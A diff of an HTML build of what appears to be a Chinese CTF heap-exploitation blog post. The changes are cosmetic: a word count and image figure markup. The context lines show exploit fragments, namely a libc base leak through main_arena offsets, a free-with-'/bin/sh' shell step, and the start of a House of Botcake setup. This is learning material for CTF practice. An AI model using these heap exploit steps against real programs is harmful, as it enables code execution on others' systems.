@@ -372,7 +372,7 @@
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">546</span> In Total
+              Words <span class="post-count">550</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -428,7 +428,10 @@
 <pre><code class="hljs python">main_arena_addr = u64(r.recvuntil(<span class="hljs-string">b&#x27;1.&#x27;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">3</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) 
 libc_addr = main_arena_addr - <span class="hljs-number">0x3c4b78</span>
 libc.address = libc_addr</code></pre>
-<p><img src="/cn/%E5%88%9D%E8%AF%86%E5%A0%86/image-20230222111213954-1679370065075-1.png"></p>
+<figure>
+<img src="/cn/%E5%88%9D%E8%AF%86%E5%A0%86/image-20230222111213954-1679370065075-1.png" alt="image-20230222111213954">
+<figcaption aria-hidden="true">image-20230222111213954</figcaption>
+</figure>
 <p>distance计算</p>
 <h3 id="不知道libc版本">不知道libc版本</h3>
 <pre><code class="hljs python">main_arena_addr = u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">96</span> <span class="hljs-comment">#固定的96偏移</span>
@@ -473,7 +476,10 @@ add(<span class="hljs-number">8</span>,<span class="hljs-number">0x50</span>,<sp
 pause()
 delete(<span class="hljs-number">4</span>)
 <span class="hljs-comment">#free且传参/bin/sh</span></code></pre>
-<p><img src="/cn/%E5%88%9D%E8%AF%86%E5%A0%86/image-20230222112549250-1679370065076-3.png"></p>
+<figure>
+<img src="/cn/%E5%88%9D%E8%AF%86%E5%A0%86/image-20230222112549250-1679370065076-3.png" alt="image-20230222112549250">
+<figcaption aria-hidden="true">image-20230222112549250</figcaption>
+</figure>
 <h2 id="house-of-botcake">House Of Botcake</h2>
 <pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):
     add(i,<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)
